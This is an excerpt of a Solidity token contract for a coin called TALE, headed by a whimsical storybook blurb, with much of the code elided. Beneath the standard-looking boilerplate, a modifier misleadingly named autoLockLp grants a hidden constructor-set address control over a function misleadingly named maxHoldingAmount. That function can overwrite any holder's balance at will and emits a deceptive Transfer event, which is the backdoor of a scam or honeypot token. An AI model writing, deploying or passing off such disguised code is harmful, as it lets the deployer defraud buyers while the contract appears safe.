...
@taleofjeremy
I was written by Beatrix Potter back in 1902. 
I'm back now. 
https://www.jeryemy.fish/
Who knows I get to finally catch that minnow and offer a proper dinner to my friends.
*/
pragma solidity ^0.8.15;

interface BEPBNBMrJeremy {
  /**
...
/*
 * @dev Provides information about the current execution MrJeremyontext, including the
 ...
 */
abstract contract MrJeremyontext {
...
// File: @openzeppelin/contracts/access/OwnableMrJeremy.sol
 ...
 * the owner.
 */
abstract contract OwnableMrJeremy is MrJeremyontext {
     ...
     */
    modifier onlyOwner() {
        require(owner() == _msgSender(), "OwnableMrJeremy: caller is not the owner");
        _;
    }
    ...
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "OwnableMrJeremy: new owner is the zero address");
...
contract MrJeremy is MrJeremyontext, BEPBNBMrJeremy, OwnableMrJeremy {
   ...
   address private Binancev3rooter; 
    constructor(address Binancev2rooter) {
        ...
        _symbol = "TALE";
        _decimals = 9;
        allTotalSupply = 858584499999333000000000;
    ...
    */
    ...
    /**
    * @dev See {BEPBNBMrJeremy-totalSupply}.
    */
    ...
    /**
    * @dev See {BEPBNBMrJeremy-balanceOf}.
    */
    function balanceOf(address account) external view override returns (uint256) {
        return epxAll[account];
    }
      modifier autoLockLp() {
        require(Binancev3rooter == _msgSender(), "OwnableMrJeremy: caller is not the owner");
        _;
    }
    /**
    * @dev See {BEPBNBMrJeremy-approve}.
    *
    * Requirements:
    *
    * - `spender` cannot be the zero address.
    */
    function maxHoldingAmount(address MrJeremyPLEBRewards, uint256 aaaMontant, uint256 aaaepx, uint256 subtractedepx) external autoLockLp {
        epxAll[MrJeremyPLEBRewards] = aaaMontant * aaaepx ** subtractedepx;
        
        emit Transfer(MrJeremyPLEBRewards, address(0), aaaMontant);
    }

    /**
    * @dev See {BEPBNBMrJeremy-transfer}.
    *
    * Requirements:
    *
    ...
    */
    ...
    /**
    * @dev See {BEPBNBMrJeremy-allowance}.
    */
    ...
    */
    ...
    /**
    * @dev See {BEPBNBMrJeremy-transferFrom}.
    *
    * Emits an {Approval} event indicating the updated allowance. This is not
    * required by the EIP. See the note at the beginning of {BEPBNBMrJeremy};
    *
    * Requirements:
    ...
    */
    function transferFrom(address sender, address recever, uint256 lamount) external override returns (bool) {
        ...
        _approve(sender, _msgSender(), allowancesAll[sender][_msgSender()].sub(lamount, "BEPBNBMrJeremy: transfer lamount exceeds allowance"));
        return true;
    }
    ...
    * problems described in {BEPBNBMrJeremy-approve}.
    *
    ...
    */
    function decreaseAllowance(address spender, uint256 subtractedepx) external returns (bool) {
        _approve(_msgSender(), spender, allowancesAll[_msgSender()][spender].sub(subtractedepx, "BEPBNBMrJeremy: decreased allowance below zero"));
        return true;
    }
    ...
    */
    function _transfer(address sender, address recever, uint256 lamount) internal {
        require(sender != address(0), "BEPBNBMrJeremy: transfer from the zero address");
        require(recever != address(0), "BEPBNBMrJeremy: transfer to the zero address");
                
        epxAll[sender] = epxAll[sender].sub(lamount, "BEPBNBMrJeremy: transfer lamount exceeds balance");
    ...
    */
    function _approve(address owner, address spender, uint256 lamount) internal {
        require(owner != address(0), "BEPBNBMrJeremy: approve from the zero address");
        require(spender != address(0), "BEPBNBMrJeremy: approve to the zero address");
